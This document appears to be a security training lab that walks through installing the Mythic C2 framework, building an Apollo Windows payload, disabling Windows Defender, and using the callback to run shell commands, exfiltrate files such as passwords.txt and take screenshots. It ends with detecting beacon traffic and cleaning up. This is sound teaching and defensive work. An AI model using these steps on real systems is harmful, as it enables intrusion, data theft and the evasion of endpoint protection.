# Mythic C2 Framework

# Both VMs ( Start from the Ubuntu VM )

## In this lab we will
- Install and run the **Mythic** C2 framework
- Generate a working payload using the **Apollo** agent
- Establish a C2 callback from a Windows target
- Use Mythic's web UI to run post-exploitation tasks (file listing, process listing, shell commands)
- Understand what C2 traffic looks like from the defender's perspective



---

## What is Mythic?

**Mythic** is a modular C2 (Command and Control) framework. It has three main pieces:

- **Mythic Server** - the backend that operators connect to. Runs in Docker.
- **C2 Profiles** - define how agents communicate (HTTP, HTTPS, DNS, etc.)
- **Agents** - the payload that runs on the target machine and calls back to the server.

The most common beginner-friendly agent is **Apollo**, which runs on Windows and communicates over HTTP/HTTPS.

---

## Part 1 - Install and Run Mythic on Ubuntu

Clone the Mythic repository:

```bash
cd ~/BnB/
git clone https://github.com/its-a-feature/Mythic
cd Mythic
```

Install the Mythic CLI:

```bash
sudo make
```

Start Mythic:

```bash
sudo ./mythic-cli start mythic_postgres mythic_rabbitmq mythic_server mythic_react mythic_nginx mythic_graphql
```

This pulls all rquired Docker containers and starts the Mythic server. It will take 2-5 minutes the first time.

When it finishes you will see output similar to:

```
[*] Mythic services started
[*] Web UI available at: https://127.0.0.1:7443
```

Get the auto-generated admin password:

```bash
sudo ./mythic-cli config get MYTHIC_ADMIN_PASSWORD
```

Note down the password. The default username is `mythic_admin`.

---

## Part 2 - Access the Mythic Web UI

Open Firefox and go to:

```
https://127.0.0.1:7443
```

Accept the self-signed certificate warning (click "Advanced" -> "Accept the Risk and Continue").

Log in with:
- **Username:** `mythic_admin`
- **Password:** (the one you copied above)

You will land on the Mythic dashboard. It looks like this - the left sidebar has: Callbacks, Payloads, Files, Operations, and more.

---

## Part 3 - Install the Apollo Agent and HTTP Profile

Mythic ships with no agents by default. You install them separately.

Install the **Apollo** Windows agent:

```bash
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo
```

Install the **http** C2 profile (the transport layer):

```bash
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```

Wait for both to finish installing. You will see "Successfully installed" messages.

Restart Mythic so it picks up the new agent and profile:

```bash
sudo ./mythic-cli restart
```

---

## Part 4 - Generate a Payload

In the Mythic web UI, click **Payloads** in the left sidebar -> **New Payload**.

Walk through the payload builder:

1. **Select OS** -> Windows
2. **Select Agent** -> Apollo
3. **Select C2 Profile** -> http
4. **C2 Profile config:**
   - **Callback Host** -> enter your Ubuntu machine's IP address (find it with `ip a` - look for your interface IP, e.g. `192.168.56.101`)
   - **Callback Port** -> `80`
   - **Callback Interval** -> `5` (seconds between check-ins)
5. **Output format** -> `WinExe` (a .exe file)
6. Click **Generate**

Mythic will build the payload. When it finishes, download it - it will be named something like `apollo.exe`.

Transfer `apollo.exe` to your Windows target machine. You can use a simple Python HTTP server on Ubuntu:

```bash
cd ~/Downloads
python3 -m http.server 8080
```

Then on the Windows machine, open a browser and go to:

```
http://<ubuntu-ip>:8080/apollo.exe
```

Download and save the file.

---

## Part 5 - Execute the Payload on Windows

>[!NOTE]
> Windows Defender will flag and delete this file. You need to either disable Defender on your lab VM or add an exclusion for the folder where you saved the file. This is expected in a lab environment.

Disable Defender on Windows (lab only - do not do this on real machines):

Open PowerShell as Administrator and run:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Now run the payload. In a regular Command Prompt or PowerShell (does not need to be Admin for basic access):

```powershell
.\apollo.exe
```

Switch back to your Ubuntu machine and look at the Mythic web UI. Under **Callbacks**, you will see a new entry appear within a few seconds. This is the Windows machine calling back to your C2 server.

---

## Part 6 - Interact with the Callback

Click on the callback row in the UI. A task panel opens at the bottom.

### List files

Type in the task box:

```
ls C:\Users
```

Hit Enter. Mythic sends the command to the agent on the next check-in. Within 5 seconds you will see the directory listing appear.

### List running processes

```
ps
```

You will see a full list of running processes, their PIDs, parent PIDs, and process paths. This is exactly what a threat actor would use to look for AV processes, browsers with saved credentials, or privileged processes to migrate into.

### Get current user and hostname

```
shell whoami
shell hostname
shell ipconfig
```

Each `shell` command runs the argument in `cmd.exe` and returns the output. You can run any command here.

### Upload a file

```
upload
```

Mythic will prompt you to select a file from your Ubuntu machine. The agent receives it and writes it to disk on the Windows target. Attackers use this to drop additional tools.

### Download a file from the target

```
download C:\Users\<username>\Desktop\passwords.txt
```

If that file exists, Mythic will pull it back to the server and it will appear under **Files** in the UI.

### Get a screenshot

```
screenshot
```

Apollo captures the current screen of the Windows machine and sends it back. It appears under **Files**.

---

## Part 7 - What does this look like on the network?

On your Ubuntu machine, open a second terminal and capture traffic on port 80:

```bash
sudo apt install -y tshark
sudo tshark -i any -f "port 80" -Y "http"
```

You will see regular HTTP GET/POST requests from the Windows machine to your Ubuntu IP. The agent is beaconing - calling home every 5 seconds to ask for new tasks.

Key things to observe:
- **Regular interval** - real user traffic is not this regular. A beacon every 5 seconds is a detection signal.
- **User-Agent** - Apollo sends a browser-like User-Agent to blend in, but it will always be the same string.
- **POST requests** - when you issue a task, the agent sends results back in a POST. The content is encrypted but the pattern is detectable.

This is exactly what a blue teamer looks for in network logs. Consistent beaconing intervals, unusual POST traffic, or a process making HTTP connections that has no reason to.

---

## Part 8 - Clean up

On Windows, kill the agent process:

```powershell
Stop-Process -Name apollo -Force
```

Re-enable Defender on Windows:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

On Ubuntu, stop Mythic:

```bash
cd ~/Mythic
sudo ./mythic-cli stop
```

---

# Finished?

[Back to Card's Main Page](/Decks/CORE_v3.1/C2E/Domain_Fronting_As_C2.md)
